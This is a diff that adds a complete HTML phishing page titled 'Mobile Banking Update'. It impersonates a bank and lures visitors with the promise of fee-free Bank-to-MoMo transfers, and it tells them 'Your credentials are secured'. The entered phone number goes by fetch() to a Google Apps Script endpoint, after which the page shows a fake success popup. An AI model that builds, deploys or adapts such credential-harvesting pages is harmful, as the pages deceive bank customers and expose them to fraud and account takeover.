@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Mobile Banking Update</title>
+
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #001B48; /* Dark Blue */
+        font-family: Arial, sans-serif;
+        color: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .container {
+        text-align: center;
+        width: 90%;
+        max-width: 400px;
+    }
+
+    h1 {
+        font-size: 26px;
+        font-weight: bold;
+        margin-bottom: 15px;
+        color: white;
+    }
+
+    .subtitle {
+        font-size: 14px;
+        line-height: 1.5;
+        color: #d9e6ff;
+        margin-bottom: 25px;
+    }
+
+    label {
+        display: block;
+        font-size: 16px;
+        margin-bottom: 8px;
+        color: white;
+    }
+
+    input[type="text"] {
+        width: 100%;
+        padding: 12px;
+        border-radius: 6px;
+        border: none;
+        font-size: 16px;
+        margin-bottom: 20px;
+    }
+
+    button {
+        width: 100%;
+        padding: 12px;
+        background: #BFBFBF; /* Grey */
+        color: black; /* Black text */
+        border: none;
+        font-size: 16px;
+        font-weight: bold;
+        border-radius: 6px;
+        cursor: pointer;
+    }
+
+    button:hover {
+        background: #A5A5A5;
+    }
+
+    footer {
+        margin-top: 25px;
+        font-size: 13px;
+        color: #cccccc;
+    }
+
+    /* SUCCESS POPUP */
+    #successPopup {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        color: #001B48;
+        padding: 25px;
+        border-radius: 10px;
+        box-shadow: 0 0 20px rgba(0,0,0,0.3);
+        width: 80%;
+        max-width: 300px;
+        text-align: center;
+        font-size: 18px;
+        display: none;
+        animation: fadeIn 0.4s ease;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translate(-50%, -55%); }
+        to { opacity: 1; transform: translate(-50%, -50%); }
+    }
+
+    #successPopup button {
+        margin-top: 15px;
+        background: #001B48;
+        color: white;
+    }
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <h1>MOBILE BANKING UPDATE</h1>
+
+    <p class="subtitle">
+        Validating your phone number to the account enables you to make transactions 
+        from Bank to MoMo or vice-versa without any fees associated.
+    </p>
+
+    <form id="submitForm">
+        <label for="phone">Phone Number</label>
+        <input type="text" id="phone" name="Phone number" placeholder="Enter phone number" required>
+
+        <button type="submit">Submit</button>
+    </form>
+
+    <footer>Your credentials are secured</footer>
+
+</div>
+
+<!-- Success Popup -->
+<div id="successPopup">
+    ✔️ Phone Number Submitted Successfully!
+    <br>
+    <button onclick="closePopup()">OK</button>
+</div>
+
+<script>
+    const form = document.getElementById("submitForm");
+    const popup = document.getElementById("successPopup");
+
+    // Paste your Google Apps Script URL here
+    const scriptURL = "https://script.google.com/macros/s/AKfycbzcjPW2L4AZw7smX_QkbUQXSumqCWtpNy2S0jsJucrE7TKxt9t7U3X-QWnaOtbitLOv/exec";
+
+    form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const formData = new FormData(form);
+
+        try {
+            await fetch(scriptURL, { method: "POST", body: formData });
+
+            // Show success popup
+            popup.style.display = "block";
+
+            // Reset form
+            form.reset();
+
+        } catch (err) {
+            alert("Network Error — Please try again.");
+        }
+    });
+
+    function closePopup() {
+        popup.style.display = "none";
+    }
+</script>
+
+</body>
+</html>
